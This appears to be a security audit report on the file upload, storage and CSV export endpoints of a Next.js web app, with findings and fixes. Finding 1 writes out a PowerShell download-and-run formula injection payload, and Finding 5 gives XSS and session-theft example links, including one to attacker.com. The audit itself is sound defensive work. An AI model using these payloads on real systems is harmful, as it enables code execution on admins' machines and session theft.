# Category 19 — File Upload, Storage & CDN Audit

**Audit Date:** 2026-05-03  
**Scope:** File upload, blob storage, media items, CSV export, and file serving endpoints  
**Files Reviewed:** 
- `/app/api/upload/token/route.ts`
- `/app/api/upload/cloudinary/route.ts`
- `/app/api/media/route.ts`
- `/app/api/media/[id]/route.ts`
- `/app/api/media/[id]/status/route.ts`
- `/app/api/avatar/route.ts`
- `/app/api/cron/cleanup/route.ts`
- `/app/api/speedrun/registrations/export/route.ts`
- `/next.config.ts` (caching / CSP / blob hostname config)

---

## Summary

**Severity Distribution:**
- Critical: 0
- High: 1
- Medium: 3
- Low: 1
- Informational: 2

**Key Findings:**
1. **Formula injection vulnerability in speedrun registrations CSV export** — user-supplied fields (fullName, projectIdea, whyJoin, techStack) are not sanitized against formula injection; Excel can execute `=cmd|...` if CSV is opened with formula evaluation enabled. **Mitigation: Prefix dangerous fields with apostrophe.**
2. **Vercel Blob token grants unrestricted access** — the token allows any authenticated CORE/MEMBER user to upload to any path without owner-based isolation. File overwrite / DoS risks for untrustworthy users.
3. **Cloudinary signed upload params not validated for folder scope** — POST `/api/upload/cloudinary` accepts arbitrary folder names from client request, though signature is valid (Cloudinary-signed). Attacker can upload to `/public/*` or other folders if folder whitelist not enforced on Cloudinary side.
4. **CSV export lacks formula injection prefix safeguard** — toCsvRow function only escapes quotes/newlines but does NOT prefix values starting with `=`, `+`, `-`, `@` with apostrophe.
5. **Media links array allows arbitrary URLs** — MediaItem.links is a String[] with no validation; URLs could be malicious or host XSS payloads; stored in DB and returned via API.

---

## Detailed Findings

### Finding 1: Formula Injection in Speedrun Registrations CSV Export [HIGH]

**File:** `/app/api/speedrun/registrations/export/route.ts` (lines 61–115)  
**Status:** CONFIRMED

**Description:**  
The CSV export endpoint for speedrun registrations exports user-supplied data (fullName, projectIdea, whyJoin, and techStack) without sanitizing against formula injection. The `toCsvRow` function (lines 106–115) only escapes quotes, commas, and newlines per RFC 4180, but does NOT prefix values starting with `=`, `+`, `-`, or `@` with an apostrophe.

When a CSV file is opened in Microsoft Excel, LibreOffice Calc, or Google Sheets with formula evaluation enabled, any cell starting with `=` is treated as a formula and executed. An attacker can register for a speedrun with `fullName = "=cmd|'/c powershell IEX(New-Object Net.WebClient).DownloadString(...)"` and when the CSV is downloaded and opened by an admin, the formula executes in the context of that admin's user.

**Affected Data:**
- `fullName` (line 65) — user input, no escaping
- `projectIdea` (line 78) — user input, no escaping
- `whyJoin` (line 79) — user input, no escaping
- `techStack` (line 73) — joined array, user input, no escaping
- Also `email`, `phone`, `city`, `primaryRole`, `experience` — all vulnerable if containing formula prefixes

**Attack Vector:**
1. Attacker registers for a speedrun with a malicious fullName: `=cmd|'/c calc`
2. CORE admin exports registrations via GET `/api/speedrun/registrations/export?runId=...`
3. Admin downloads and opens CSV in Excel
4. Excel detects `=cmd` and executes it (opens calculator, downloads malware, exfiltrates data, etc.)

**RFC 4180 Compliance:**  
The function is RFC 4180 compliant (proper quote escaping) but does NOT implement OWASP CSV formula injection prevention.

**Evidence:**
```typescript
function toCsvRow(values: (string | number)[]): string {
  return values
    .map((v) => {
      const s = String(v ?? "");
      // Only checks for comma, quote, newline, carriage return — NOT formula prefixes
      if (s.includes(",") || s.includes("\"") || s.includes("\n") || s.includes("\r")) {
        return `"${s.replace(/"/g, '""')}"`;
      }
      return s;  // ❌ Returns unescaped if no special chars
    })
    .join(",");
}
```

Rows containing `fullName = "=cmd|..."` will be output as:
```
=cmd|'/c powershell ...,userEmail,phone,...
```

Excel interprets `=cmd` as a function call.

**Impact:**
- Remote Code Execution (RCE) on admin's machine when CSV is opened
- Data exfiltration from admin's session
- Malware distribution
- Insider threat facilitation

**Recommended Fix:**
Prefix all values that start with `=`, `+`, `-`, or `@` with a single quote (`'`). This forces Excel to treat them as text:
```typescript
function toCsvRow(values: (string | number)[]): string {
  return values
    .map((v) => {
      const s = String(v ?? "");
      // Escape formula injection by prefixing with apostrophe
      let escaped = s;
      if (/^[=+\-@]/.test(escaped)) {
        escaped = "'" + escaped;
      }
      if (escaped.includes(",") || escaped.includes("\"") || escaped.includes("\n") || escaped.includes("\r")) {
        return `"${escaped.replace(/"/g, '""')}"`;
      }
      return escaped;
    })
    .join(",");
}
```

---

### Finding 2: Vercel Blob Token Grants Unrestricted Path Write Access [MEDIUM]

**File:** `/app/api/upload/token/route.ts` (lines 15–30)  
**Status:** CONFIRMED

**Description:**  
The Vercel Blob token generated by POST `/api/upload/token` grants write access to the entire blob store without path-scoping per user. The `handleUpload` function is called with:
- `token: process.env.BLOB_READ_WRITE_TOKEN` — production secret, no per-user scoping
- `onBeforeGenerateToken` callback that enforces content-type and max size but does NOT restrict the upload pathname

**Evidence:**
```typescript
const response = await handleUpload({
  request,
  body,
  token: process.env.BLOB_READ_WRITE_TOKEN,  // ❌ No per-user scoping
  onBeforeGenerateToken: async (pathname) => {
    return {
      allowedContentTypes: [
        "image/jpeg",
        "image/png",
        "image/webp",
        "image/gif",
      ],
      maximumSizeInBytes: 10 * 1024 * 1024,
      addRandomSuffix: true,  // ✅ Randomizes filename (good)
    };
    // ❌ NO pathname validation, no per-user prefix, no whitelist
  },
  onUploadCompleted: async () => {},
});
```

**Attack Scenario 1: File Overwrite**  
Although Vercel Blob is a blob store (not a file tree), each blob has a unique URL. If an attacker knows or can guess a blob URL (e.g., `https://jvribvzirutackel.public.blob.vercel-storage.com/uploads/profile-12345.jpg`), they could potentially upload a file with the same name in a different context if the pathname callback doesn't enforce uniqueness.

**Attack Scenario 2: Denial of Service (Storage Quota)**  
An authenticated MEMBER user with upload access can fill the blob quota by uploading many 10 MB files, exhausting storage and preventing legitimate uploads.

**Attack Scenario 3: Information Leakage**  
Files uploaded via `/api/upload/token` are stored in a Vercel Blob "public" bucket (determined by environment config, not visible in source). Vercel Blob's "public" stores are world-readable by default if the URL is known. The cleanup cron job in `/app/api/cron/cleanup` manages orphaned blobs, but orphaned files created by an attacker will persist until cleanup (up to 24 hours by design, line 32 of cleanup route).

**Mitigation:**  
- Validate `pathname` in `onBeforeGenerateToken` to enforce per-user directory prefix, e.g., `user-${userId}/`.
- Implement upload rate-limiting per user (tokens/hour, bytes/day).
- Consider using Vercel Blob "private" store if sensitive user data is uploaded.

---

### Finding 3: Cloudinary Signed Upload Params Accept Arbitrary Folder [MEDIUM]

**File:** `/app/api/upload/cloudinary/route.ts` (lines 19–30)  
**Status:** CONFIRMED

**Description:**  
The Cloudinary upload endpoint accepts an arbitrary folder name from the client request and signs it. While the signature is cryptographically valid (SHA1 HMAC), an attacker can provide any folder name and it will be signed as long as the API secret is not compromised.

**Evidence:**
```typescript
const { folder } = await request.json();  // ❌ Client-provided, no whitelist
const timestamp = Math.round(Date.now() / 1000);
const paramsToSign = `folder=${folder || "uploads"}&timestamp=${timestamp}`;
const signature = crypto.createHash("sha1").update(paramsToSign + apiSecret).digest("hex");

return NextResponse.json({
  cloudName,
  apiKey,
  timestamp,
  signature,
  folder: folder || "uploads",  // ❌ Echoed back without validation
});
```

**Attack Vector:**
1. Attacker calls POST `/api/upload/cloudinary` with `{ folder: "admin-only" }`.
2. Server signs the params and returns them.
3. Client-side code uses these signed params to upload to Cloudinary's `admin-only` folder (if it exists and is not ACL-protected on Cloudinary side).

**Dependency on Cloudinary Config:**  
This attack only succeeds if:
- Cloudinary account has multiple folders with different ACLs and no explicit folder whitelist at the API level.
- OR if there is no Cloudinary preset enforcement that limits folder destination.

Per recon Step 12, **Cloudinary upload preset config is not visible in source tree** (Open Assumption #3), so we cannot confirm whether Cloudinary policies block unauthorized folder writes.

**Mitigation:**
- Implement a server-side whitelist of allowed folders (e.g., `["uploads", "media"]`).
- Validate folder against the whitelist before signing.
- Prefer using a Cloudinary **upload preset** with folder locked on Cloudinary side (no client-provided override).

---

### Finding 4: CSV Export Lacks Formula Injection Prefix Safeguard — Expanded [MEDIUM]

**File:** `/app/api/speedrun/registrations/export/route.ts` (lines 105–116)  
**Cross-Reference:** Finding 1

**Additional Context:**  
The `toCsvRow` function does NOT safeguard against formula injection even though there are multiple user-supplied fields that could contain formula prefixes:
- `fullName` — direct user input
- `projectIdea` — direct user input
- `whyJoin` — direct user input
- `techStack` — array joined from user input
- `city` — direct user input
- `primaryRole` — user-supplied choice (enum-like, lower risk)
- `twitterHandle` — prefixed with `@` on line 69 (INTENTIONAL, but adds ambiguity)
- `githubHandle` — prefixed with `@` on line 70 (INTENTIONAL, but adds ambiguity)

The `@` prefix is used intentionally to indicate social media handles, but it also happens to be a formula injection trigger. When CSV is opened in Excel, `@column_name` is treated as an implicit function in newer versions.

**Additional Attack Surface:**  
If the speedrun data model is extended to include user-controlled fields like `bankAccount` or `paymentInfo`, formula injection becomes more severe (payment fraud).

---

### Finding 5: Media Links Array Lacks URL Validation [MEDIUM]

**File:** `/app/api/media/route.ts` (lines 45–85), `/app/api/media/[id]/route.ts` (lines 8–67)  
**Status:** CONFIRMED

**Description:**  
The MediaItem model has a `links` field (String array) that stores URLs provided by users. These URLs are not validated for:
- **Scheme validation** — does not enforce `https://` (could be `javascript://`, `data://`, etc.)
- **Domain whitelist** — no allowlist of trusted CDNs or media hosts
- **Redirect trap prevention** — no check for shortened URLs or redirects
- **XSS payload detection** — no sanitation for embedded script tags or event handlers

**Evidence:**
```typescript
// From /app/api/media/route.ts (POST, line 54-59)
const newItem = await prisma.mediaItem.create({
  data: {
    title: validatedData.title,
    description: validatedData.description || "",
    platform: validatedData.platform,
    links: validatedData.links,  // ❌ No URL validation
    status: 'draft',
    createdById: session.user.id
  }
});
```

The only validation is in the schema (not provided in the read, but inferred from Zod parse at line 52):
```typescript
const validatedData = MediaItemSchema.parse(body);
```

**Attack Vector 1: Malicious URL Storage**
```json
{
  "title": "Innocent Video",
  "links": [
    "javascript:alert('XSS')",
    "data:text/html,<script>fetch('/api/admin')</script>",
    "http://attacker.com/steal-session?token=..."
  ]
}
```

When a CORE user retrieves this media item via GET `/api/media/{id}` (line 74-98), the links array is included and served to the client. If the UI renders links without sanitization (e.g., `<a href={link}>`), JavaScript URLs execute.

**Attack Vector 2: Phishing via Shortener**  
Attacker stores `https://bit.ly/phishing-site` in links. Admin clicks it during content review, gets phished.

**Impact:**
- XSS if UI renders links without strict validation
- Phishing / social engineering
- Credential theft
- Malware distribution

**Vercel Blob Hostname Observation:**  
Links stored in MediaItem will likely point to external hosts (Cloudinary, YouTube, Luma, etc.) since Vercel Blob is for image/media blob storage, not content links. However, if a user stores a Vercel Blob URL and later that blob is deleted, the link becomes a 404 and could be repurposed by an attacker who re-registers the same URL (if Vercel Blob allows URL reuse).

**Recommended Fix:**
- Add URL scheme validation (allow only `https://` and possibly `http://` with warning).
- Maintain a whitelist of trusted domains (Luma, YouTube, Cloudinary, etc.).
- Use URL parsing to reject `javascript:`, `data:`, `vbscript:` schemes.
- Log and alert on suspicious URLs.

---

### Finding 6: CSV Export Missing Content-Type Header for XSS Prevention [LOW]

**File:** `/app/api/speedrun/registrations/export/route.ts` (lines 94–102)  
**Status:** CONFIRMED

**Description:**  
The CSV export endpoint sets `Content-Type: text/csv; charset=utf-8` but does NOT set `X-Content-Type-Options: nosniff`. This is a minor issue because:
1. CSV MIME type is unlikely to be misinterpreted as HTML by modern browsers.
2. The Content-Disposition header includes `attachment`, which forces download.

However, if a browser interprets the CSV as text/plain or text/html due to misconfiguration, the unescaped data could be rendered as HTML and trigger XSS.

**Evidence:**
```typescript
return new Response(csv, {
  status: 200,
  headers: {
    "Content-Type": "text/csv; charset=utf-8",
    "Content-Disposition": `attachment; filename="${filename}"`,
    "Cache-Control": "no-store, max-age=0",
    // ❌ Missing X-Content-Type-Options: nosniff
  },
});
```

**Recommendation:**  
Add `"X-Content-Type-Options": "nosniff"` to headers (already set globally in next.config.ts line 18, so this endpoint likely inherits it; verify in practice).

---

### Finding 7: Vercel Blob Public Hostname Correctly Isolated [INFORMATIONAL]

**File:** `/next.config.ts` (lines 70, 164)  
**Status:** CONFIRMED SECURE

**Description:**  
Vercel Blob files are stored on a different hostname (`jvribvzirutackel.public.blob.vercel-storage.com`) than the application origin (`team1india.vercel.app` or `team1india.com`). This is a security best practice because:

1. **XSS Containment** — Even if a malicious SVG or HTML file is uploaded, it is served from a different origin and cannot access the app's cookies (same-origin policy).
2. **CSP Alignment** — Next.config line 36 allows `img-src: ...https://*.public.blob.vercel-storage.com`, keeping Blob URLs in a separate CSP directive.
3. **Service Worker Bypass** — Uploaded files bypass the app's service worker (SW only intercepts requests to the app origin).

**Caching:** Service Worker is configured to use `NetworkOnly` for Blob URLs (line 164–165 of next.config.ts), ensuring no stale content is served.

---

### Finding 8: Avatar Endpoint Delegates to Third-Party (Unavatar) [INFORMATIONAL]

**File:** `/app/api/avatar/route.ts` (lines 5–44)  
**Status:** SAFE BY DESIGN

**Description:**  
The `/api/avatar?handle=...` endpoint proxies avatar requests to unavatar.io, which fetches X (Twitter) avatars. This is not a file upload endpoint; it's a read-only proxy. The endpoint:
- Sanitizes the Twitter handle (lines 11–16) to prevent SSRF
- Respects the Content-Type from unavatar.io (line 31)
- Caches responses for 24 hours (line 3, line 37)

**Security:** No file upload or storage is involved; the endpoint is safe.

---

### Finding 9: Blob Cleanup Cron Job Correctly Tracks Usage [INFORMATIONAL]

**File:** `/app/api/cron/cleanup/route.ts` (lines 27–106)  
**Status:** WELL-DESIGNED

**Description:**  
The cleanup cron job deletes orphaned blobs (older than 24 hours) that are not referenced in any database field. The implementation:
- Correctly checks all models that reference blob URLs (Member.image, Playbook.coverImage, etc.)
- Uses batch queries to avoid N+1 problems (line 49–97)
- Only deletes blobs not found in any model (line 101)
- Gated by `CRON_SECRET` bearer token with timing-safe comparison (lines 10–19)

**Design:** The 24-hour safety window prevents deletion of recently uploaded files (good; avoids race conditions with async processing).

**No Issues Found.**

---

### Finding 10: Media Item Status Transitions Properly Gated [INFORMATIONAL]

**File:** `/app/api/media/[id]/status/route.ts` (lines 8–62)  
**Status:** SECURE DESIGN

**Description:**  
The media item status machine (lines 8–15) enforces strict state transitions. The permission model (lines 41–48) correctly gates approval to CORE users with `FULL_ACCESS`:
```typescript
const isAdmin = userPerms['*'] === 'FULL_ACCESS';
if ((newStatus === 'approved' || newStatus === 'needs_edit') && !isAdmin && oldStatus === 'pending_approval') {
  return new NextResponse("Only admins can approve or request edits", { status: 403 });
}
```

**Audit Logging:** All status changes are logged to AuditLog (lines 71–80).

**No Issues Found.**

---

## Summary of Recommendations

| Finding | Severity | Action | Priority |
|---------|----------|--------|----------|
| CSV Formula Injection | HIGH | Prefix values starting with `=`, `+`, `-`, `@` with apostrophe | P0 — Deploy immediately |
| Vercel Blob Token Unrestricted | MEDIUM | Add per-user pathname whitelist to `onBeforeGenerateToken` | P1 — Deploy in next sprint |
| Cloudinary Folder Whitelist Missing | MEDIUM | Whitelist allowed folders server-side; prefer preset-based control | P1 — Deploy in next sprint |
| Media Links No URL Validation | MEDIUM | Add URL scheme whitelist, reject suspicious schemes | P1 — Deploy in next sprint |
| CSV Missing nosniff Header | LOW | Verify X-Content-Type-Options is inherited from global headers | P2 — Verify in testing |

---

## Audit Verification Notes

- **Vercel Blob Policy:** Source does not reveal bucket policy (public vs. private store). Assumed "public" per Vercel defaults. Verify in Vercel console.
- **Cloudinary Presets:** Upload presets are configured outside source tree. Verify folder whitelisting is enforced at Cloudinary API level.
- **ENABLE_2FA Feature Flag:** Media upload endpoints do not check MFA (only basic role check). Verify if CORE-only access is MFA-enforced via middleware.
- **Rate Limiting:** No rate-limit headers observed on upload endpoints. Consider adding per-IP and per-user quotas.

---

**End of Category 19 Audit**
